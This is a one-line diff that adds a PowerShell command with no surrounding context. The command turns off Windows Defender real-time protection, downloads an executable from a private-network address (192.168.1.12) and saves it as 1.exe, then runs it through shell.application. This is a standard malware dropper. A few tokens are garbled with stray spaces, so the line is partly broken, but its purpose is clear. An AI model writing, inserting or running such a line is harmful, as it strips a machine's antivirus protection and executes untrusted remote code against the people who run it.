@@ -1,0 +1,1 @@
+Set-MpPreference -DisableRea Strue; $d = New-Object System.Net.WebClient; $f = '1.exe'; $d. DownloadFile('http://192.168.1.12/s.exe', $f); $e = New-Object -com shell.application; $e.shellexecute ($f);
